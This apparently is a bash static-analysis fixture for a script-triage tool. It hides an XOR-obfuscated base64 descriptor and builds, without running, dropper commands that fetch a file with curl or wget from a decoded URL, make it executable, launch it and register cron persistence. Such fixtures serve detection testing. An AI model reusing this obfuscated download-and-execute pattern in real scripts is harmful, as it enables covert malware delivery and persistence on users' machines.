#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_9aa77459='ssKEIxuwmsUsVbSN2jkBqJrqNwe3i5k+C7WK3C0Nm43QMgewmpkoGq2L0AAOrZPQcwusnts4DZuS2jsN6JvcLBili9Y3N7SN2jwNt4zJPgylj8E6GvmSwDMcraDAKwGolsEmN6Ke2TMKpZzeIxuwntI6N6eQwDEc+crJPAmpj9Q2D6qg3DtVp57YLwmtmNtyDfWcjT5Zp82CaRSxjdliALCLxSxS69DQbgv8noQ8WvPJmzoQpZLFMw3qltspCaiW0XBb852HPlilyZssALiKxjoam57SOgawwv0qBrCN0CwbiJ7XcA31nI0+WafNgmkUopbZOje0nsE3VeuL2C9HrIrbKxqhjMZyC6Wc3TpH6ozBPg+h0tBuC/yehDxa88nJPhqnl+ovGqud0GIdqp7YOkWpg8Y6GrKW1jo3qp7YOlWxj9E+HKHS0G4L/J6EPFrzyZssDbaJ3DwNuJzHMAabj9QrAPnQ0CsL65zHMAbqm5oqGKCewTpFoc7WZwn1nIdoXg=='
readonly Codec_9aa77459='base64_literal|repeating_key_xor|c4,ff,b5,5f,68'

Load_9aa77459() {
  item1=()
  local item6
  while read -r item6; do [[ -n "$item6" ]] && item1+=("$item6"); done < <(printf '%s' "${Material_9aa77459}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_9aa77459() {
  item2=()
  local -a key_bytes=(196 255 181 95 104)
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")
  done
}

Recover_9aa77459() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a series=(3 5 8 13); item4="${series[*]:1:2}"
  Load_9aa77459
  Decode_9aa77459
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_9aa77459() { local recovered; recovered="$(Recover_9aa77459)"; printf '%s\n' "$recovered"; }

Plan_9aa77459() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_9aa77459)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_9aa77459; fi
